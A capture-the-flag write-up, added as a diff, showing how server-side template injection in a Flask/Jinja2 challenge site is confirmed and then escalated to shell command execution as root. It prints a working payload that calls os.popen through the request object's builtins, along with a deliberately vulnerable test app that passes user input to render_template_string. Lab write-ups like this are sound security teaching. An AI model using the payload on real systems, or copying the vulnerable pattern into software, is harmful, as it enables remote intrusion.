@@ -1,0 +1,106 @@
+When you enter the given URL, you are directly presented with this text:
+
+#+quote
+Site still under construction
+Proudly powered by Flask/Jinja2
+#+end
+
+This information is here for a reason. You have two different technologies that
+go hand-in-hand when doing simple Python web development: Flask and Jinja2.
+
+First thing you can think of is that maybe Flask has some vulnerabilities that
+can be exploited. And altough that could be true, the title of the challenge is
+an hint.
+
+`Templated`... and Jinja2 is a template engine. Therefore, this could be a
+challenge where you have to know how to exploit a Server Side Template Injection
+(SSTI).
+
+First thing we can try, to verify this is doing something like this on the
+Address Bar: `http://209.97.138.240:30840/{{1+1}}`. We are trying to check if
+`1+1` is evaluated.
+
+After pressing enter...
+
+#+quote
+Error 404
+The page '2' could not be found
+#+end
+
+It seems `{{1+1}}` was evaluated to `2`! So it is confirmed that we are able to
+do an SSTI.
+
+An object we can access on a GET request is called `request`.
+If we execute `http://209.97.138.240:30840/{{request}}` we get this string
+`<Request 'http://209.97.138.240:30840/%7B%7Brequest%7D%7D' [GET]>` which
+represents an object in Python.
+
+From this object, we can see its methods and attributes. We may try doing a
+request to `http://209.97.138.240:30840/{{dir(request)}}` but we will encounter
+a 500 Internal Server Error without any relevant information.
+
+For this, I just fired an instance of Flask on my side using the following code:
+
+#+quote
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    if request.args.get('c'):
+        return render_template_string(request.args.get('c'))
+    else:
+        print(dir(request))
+        return "test"
+
+if __name__ == "__main__":
+    app.run(debug=True)
+
+#+end
+
+Then I just executed `python app.py` and follow the URL.
+Then the output of `dir(request)` will be printed to the console:
+
+#+quote
+['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_cached_json', '_get_data_for_json', '_get_file_stream', '_get_stream_for_parsing', '_load_form_data', '_parse_content_type', 'accept_charsets', 'accept_encodings', 'accept_languages', 'accept_mimetypes', 'access_control_request_headers', 'access_control_request_method', 'access_route', 'application', 'args', 'authorization', 'base_url', 'blueprint', 'cache_control', 'charset', 'close', 'content_encoding', 'content_length', 'content_md5', 'content_type', 'cookies', 'data', 'date', 'dict_storage_class', 'disable_data_descriptor', 'encoding_errors', 'endpoint', 'environ', 'files', 'form', 'form_data_parser_class', 'from_values', 'full_path', 'get_data', 'get_json', 'headers', 'host', 'host_url', 'if_match', 'if_modified_since', 'if_none_match', 'if_range', 'if_unmodified_since', 'input_stream', 'is_json', 'is_multiprocess', 'is_multithread', 'is_run_once', 'is_secure', 'json', 'json_module', 'list_storage_class', 'make_form_data_parser', 'max_content_length', 'max_form_memory_size', 'max_forwards', 'method', 'mimetype', 'mimetype_params', 'on_json_loading_failed', 'origin', 'parameter_storage_class', 'path', 'pragma', 'query_string', 'range', 'referrer', 'remote_addr', 'remote_user', 'routing_exception', 'scheme', 'script_root', 'shallow', 'stream', 'trusted_hosts', 'url', 'url_charset', 'url_root', 'url_rule', 'user_agent', 'values', 'view_args', 'want_form_data_parsed']
+#+end
+
+From here we find `application` attribute which is relevant for what we want to
+do.
+
+By following this logic, now there is a possibility of using Python MRO
+(https://www.python.org/download/releases/2.3/mro/) to our advantage do actually
+execute any shell command we want.
+
+We can import any python module by using `__import__` through the `request`
+object from Flask:
+
+#+quote
+{{request.application.__globals__.__builtins__.__import__}}
+#+end
+
+A module that is used to execute shell commands is `os`, where we can use the
+`popen` method.
+We can first try and check the id of the current user:
+
+#+quote
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+#+end
+
+The result is as follows:
+
+#+quote
+uid=0(root) gid=0(root) groups=0(root)
+#+end
+
+We are already root! Now let us see what `ls` gives us:
+
+#+quote
+bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+#+end
+
+We can clearly see that we are on the root directory of the filesystem, which
+has a funny file called `flag.txt`.
+
+To read the flag, we just do `cat flag.txt`!
